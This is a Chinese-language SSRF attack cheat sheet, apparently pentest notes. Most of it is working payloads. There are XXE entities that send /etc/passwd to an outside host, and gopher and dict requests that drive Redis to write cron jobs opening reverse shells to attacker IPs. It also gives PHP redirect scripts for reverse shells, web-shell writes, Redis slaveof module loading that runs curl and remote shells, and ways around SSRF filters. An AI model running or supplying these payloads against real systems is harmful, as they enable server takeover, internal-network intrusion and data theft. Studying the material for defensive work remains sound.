	定义
	服务端请求伪造
	构造一个由服务器发出请求的漏洞
	服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
	成因
	file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞
	挖掘
	转码服务
	在线翻译
	获取超链接的标题等内容进行显示
	请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)
	图片、文章收藏功能
	对外发起网络请求的地方，网站采集、网页抓取的地方。
	头像 (远程加载头像)
	一切要你输入网址的地方和可以输入ip的地方。
	数据库内置功能(mongodb的copyDatabase函数)
	邮件系统
	文件处理
	在线处理工具
	从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain
  #### XML
	<!ENTITY % d SYSTEM "http://wuyun.org/evil.dtd">
	<!ENTITY % file system "file:///etc/passwd" >
	<!ENTITY % d SYSTEM "http://wuyun.org/file?data=%file">
	<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://wuyun.org/urlin">
	<xenc:AgreementMethod Algorithm= "http://wuyun.org/1">
	<xenc:EncryptionProperty Target= "http://wuyun.org/2">
	<xenc:CipherReference URI= "http://wuyun.org/3">
	<xenc:DataReference URI= "http://wuyun.org/4">
	<Reference URI="http://wuyun.org/5">
	<To xmlns="http://www.w3.org/2005/08/addressing">http://wuyun.org/to</To>
	<ReplyTo xmlns="http://www.w3.org/2005/08/addressing">
	<Address>http://wuyun.org/rto</Address>
	<input message="wooyun" wsa:Action="http://wuyun.org/ip" />
	<output message="wooyun" wsa:Action="http://wuyun.org/op" />
	<wsp:PolicyReference URI=“http://wuyun.org/pr">
	<fed:Federation FederationID="http://wuyun.org/fid">
	<fed:FederationInclude>http://wuyun.org/inc</fed:FederationInclude>
	<fed:TokenIssuerName>http://wuyun.org/iss</fed:TokenIssuerName>
	<mex:MetadataReference>
	<wsa:Address>http://wuyun.org/mex</wsa:Address>
	</mex:MetadataReference>
	<edmx:Reference URI="http://wuyun.org/edmxr">
	<edmx:AnnotationsReference URI="http://wuyun.org/edmxa">
	<xbrli:identifier scheme="http://wuyun.org/xbr">
	<link:roleType roleURI="http://wuyun.org/role">
	<stratml:Source>http://wuyun.org/stml</stratml:Source>
  #### 数据库
  ##### MongoDB
	db.copyDatabase('\r\nconfig set dbfilename ssrf\r\nquit\r\n’,'test','10.6.4.166:6379')
  ##### PostgresSQL
	SELECT dblink_send_query(
	 'host=127.0.0.1 
	dbname=quit 
	user=\'\r\nconfig set dbfilename wyssrf\r\n\quit\r\n' 
	password=1 port=6379 sslmode=disable', 
	'select version();’ 
	);
  ##### MSSQL
	SELECT openrowset('SQLOLEDB', 'server=192.168.1.5;uid=sa;pwd=sa;database=master')
	SELECT * FROM OpenDatasource('SQLOLEDB', 'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories
  ##### 图片处理函数
	FFmpeg
	concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
	ImageMagick
	fill 'url(http://wyssrf.wuyun.org)'
  #### 攻击
	测试代码,需安装phpcurl模块apt-get install php7.0-curl
	<?php
	echo 'r u ok?';
	function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
	}
	$url = $_GET['url'];
	curl($url);
	?>
	对内网、本地进行端口扫描，获取服务的banner 信息
	攻击运行在内网或本地的应用程序
	对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
	攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
	读取内网资源(如：利用file协议读取本地文件等)
	跳板
	无视cdn
	利用Redis未授权访问，HTTP CRLF注入实现getshell
  ##### 文件读取
	>curl -v 'http://192.168.0.110/ssrf.php?url=file:///etc/passwd'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/12.png)

	?url=php://filter/read=convert.base64-encode/resource=./1.php
  #### 端口探测
	>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/13.png)

	>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/14.png)
  ###### SSRF+Redis
	>curl -v 'http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/15.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/16.png)
  ##### 302反弹shell
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=flushall
	302.php
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$scheme = $_GET['s'];
	$data = $_GET['data'];
	header("Location: $scheme://$ip:$port/$data");
	?>
	?url=http://xxxx/reverse.php?s=dict&ip=10.20.*.*&port=6379&bhost=*.*.*.*&bport=1234
	reverse.php
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$bhost = $_GET['bhost'];
	$bport = $_GET['bport'];
	$scheme = $_GET['s'];
	header("Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20>\\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200>\\x261\\x0a\\x0a\\x0a\"");
	?>
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=config:set:dir:/var/spool/cron/
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=config:set:dbfilename:root
	?url=http://xxxx/302.php?s=dict&ip=10.20.*.*&port=6379&data=save
	可设置burp–>intruder指定变量跑。
  ##### Mysql
	https://github.com/FoolMitAh/mysql_gopher_attack
	https://fireshellsecurity.team/isitdtu-friss/
  ##### Weblogic SSRF+Redis
	探测
	/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80
	Redis反弹
	set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/121.36.67.230/4444 0>&1\n\n\n\n"
	config set dir /etc/
	config set dbfilename crontab
	save
	/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
	SSRF+内网Struct2
	http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/
  ##### Ueditor SSRF
	/editor/ueditor/php/controller.php?action=catchimage&source[]=http://my.ip/?aaa=1%26logo.png
  ##### Discuz
	/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo
  ##### 探测存活主机
	直接访问
	http://www.xx.com/ssrf.php?url=http://192.168.0.1
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/17.png)

	伪造POST请求
	>curl -v 'http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb'
  ##### 绕过方法
	本地绕过
	http://127.0.0.1=http://localhost
	[::]绕过
	http://[::]:80=http://127.0.0.1
	@绕过
	http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
	利用短网址
	http://tool.chinaz.com/tools/dwz.aspx
	http://dwz.cn/
	DNS解析
	http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1
	自己域名设置A记录，指向127.0.0.1
	进制转换
	127.0.0.1
	八进制：0177.0.0.1
	十六进制：0x7f.0.0.1
	十进制：2130706433
	http://www.bejson.com/convert/ip2int/
	句号
	127。0。0。1
	302脚本
	<?php
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$scheme = $_GET['s'];
	$data = $_GET['data'];
	header("Location: $scheme://$ip:$port/$data");
	?>
	攻击方VPS监听8080
	dict协议
	dict://www.attack.com:8080/hello:dict等于
	ssrf.php?url=http://attack.com/302.php?s=dict&ip=www.attack.com&port=8080&data=hello:dict
	Gopher协议
	gopher:// www.attack.com:8080/gopher
	ssrf.php?url=http://attack.com/302.php?s=gopher&ip=www.attack.com&port=8080&data=gopher
	File协议
	攻击机新建file.php
	<?php
	header("Location: file:///etc/passwd");
	?>
	ssrf.php?url=http://attack.com/file.php
  ##### gopher协议的脚本转换
	抓取本地测试的正常请求
	>socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/18.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/19.png)

	将捕获日志保存txt
	使用脚本转换为支持gopher协议的字符串
	转换规则
	如果第一个字符是>或者< 那么丢弃该行字符串，表示请求和返回的时间。
	如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
	将\r字符串替换成%0d%0a
	空白行替换为%0a
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/20.png)

	本地可执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/21.png)

	远程执行需对空格进行编码后再url编码一次
	*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/192.168.0.108/12138%200>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/22.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/23.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/24.png)
  ##### 协议
	Curl版本需低于7.15.1
	file:可回显时，使用file读取任意文件
	dict:查看端口，操作内网服务
	gopher:可发出get/post请求
	使用gopher协议时，要进行两次url编码
	http/https:探测存活主机
  ##### dict协议写shell
	?url=dict://127.0.0.1:6379/set:x:<?php phpinfo();?>
	?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
	?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php
	?url=dict://127.0.0.1:6379/save
	Unicode编码
	?url=dict://127.0.0.1:6379/set:x:"\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E"
  ##### slaveof复制shell到目标
	From:http://r3start.net/index.php/2020/05/09/683
	你的redis设置一个shell的键
	Yourredis>FLUSHALL
	Yourredis>set shell "<?php phpinfo();?>"
	?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379
	?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
	?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php
	?url=dict://127.0.0.1:6379/save
	?url=dict://127.0.0.1:6379/slaveof:no:one
  ##### slaveof反弹shell
	?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379
	?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so
	?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so
	?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE
	?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
	?url=dict://127.0.0.1:6379/system.exec:'curl x.x.x.x/x'
	?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887
